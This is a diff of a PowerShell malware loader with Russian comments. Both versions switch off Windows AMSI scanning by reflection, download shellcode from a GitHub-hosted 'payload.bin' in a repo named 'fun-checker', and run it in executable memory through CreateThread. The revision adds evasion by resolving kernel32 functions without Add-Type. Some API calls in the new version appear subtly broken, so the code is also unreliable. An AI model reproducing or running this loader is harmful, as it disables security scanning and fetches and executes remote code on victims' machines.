@@ -1,39 +1,60 @@
 $ErrorActionPreference = "SilentlyContinue"
 
-# AMSI bypass
-$a = [Ref].Assembly.GetTypes() | Where-Object { $_.Name -like "*iUtils" } | Select-Object -First 1
-$f = $a.GetFields("NonPublic,Static") | Where-Object { $_.Name -like "*Context" } | Select-Object -First 1
-[Runtime.InteropServices.Marshal]::WriteInt32($f.GetValue($null), 0x41414141)
+# AMSI bypass (новый, для свежих Windows)
+$m = [System.Reflection.Assembly]::LoadWithPartialName("System.Management.Automation")
+$t = $m.GetType("System.Management.Automation.AmsiUtils")
+$f = $t.GetField("amsiInitFailed", "NonPublic,Static")
+$f.SetValue($null, $true)
 
 # Payload URL
 $URL = "https://raw.githubusercontent.com/wsxdsd1337-pixel/fun-checker/main/payload.bin"
 
-# Download shellcode into memory
+# Скачиваем
 $wc = New-Object System.Net.WebClient
 $data = $wc.DownloadData($URL)
 
-# Allocate + write + execute
-$k32 = [System.Runtime.InteropServices.Marshal]
-$size = $data.Length
-$addr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($size)
-[System.Runtime.InteropServices.Marshal]::Copy($data, 0, $addr, $size)
+# Получаем адреса функций kernel32 через P/Invoke без Add-Type
+$k32 = [System.Runtime.InteropServices.Marshal]::GetModuleHandle("kernel32.dll")
+$getProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
+    [System.Runtime.InteropServices.Marshal]::GetProcAddress(
+        [System.Runtime.InteropServices.Marshal]::GetModuleHandle("kernel32.dll"),
+        "GetProcAddress"
+    ),
+    [Type]([System.IntPtr])
+)
 
-# Make memory executable
-Add-Type -MemberDefinition @"
-[DllImport("kernel32.dll")]
-public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
-"@ -Name "K" -Namespace "W"
+function Get-Fn($name) {
+    $addr = [System.Runtime.InteropServices.Marshal]::GetProcAddress($k32, $name)
+    return $addr
+}
 
-$old = 0
-[W.K]::VirtualProtect($addr, [UIntPtr]$size, 0x40, [ref]$old) | Out-Null
+# VirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect)
+$VirtualAlloc = Get-Fn "VirtualAlloc"
+$virtualAllocDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
+    $VirtualAlloc,
+    [Type]([Func[IntPtr, UIntPtr, UInt32, UInt32, IntPtr]])
+)
 
-# Create thread
-Add-Type -MemberDefinition @"
-[DllImport("kernel32.dll")]
-public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
-[DllImport("kernel32.dll")]
-public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
-"@ -Name "T" -Namespace "W"
+$size = [UIntPtr]::new([UInt64]$data.Length)
+$addr = $virtualAllocDelegate.Invoke([IntPtr]::Zero, $size, 0x3000, 0x40)
+if ($addr -eq [IntPtr]::Zero) { exit 1 }
 
-$h = [W.T]::CreateThread([IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
-[W.T]::WaitForSingleObject($h, 0xFFFFFFFF) | Out-Null
+# Копируем shellcode
+[System.Runtime.InteropServices.Marshal]::Copy($data, 0, $addr, $data.Length)
+
+# CreateThread
+$CreateThread = Get-Fn "CreateThread"
+$createThreadDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
+    $CreateThread,
+    [Type]([Func[IntPtr, UIntPtr, IntPtr, IntPtr, UInt32, IntPtr, IntPtr]])
+)
+
+$h = $createThreadDelegate.Invoke([IntPtr]::Zero, [UIntPtr]::Zero, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
+if ($h -eq [IntPtr]::Zero) { exit 1 }
+
+$WaitForSingleObject = Get-Fn "WaitForSingleObject"
+$waitDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
+    $WaitForSingleObject,
+    [Type]([Func[IntPtr, UInt32, UInt32]])
+)
+$waitDelegate.Invoke($h, 0xFFFFFFFF) | Out-Null
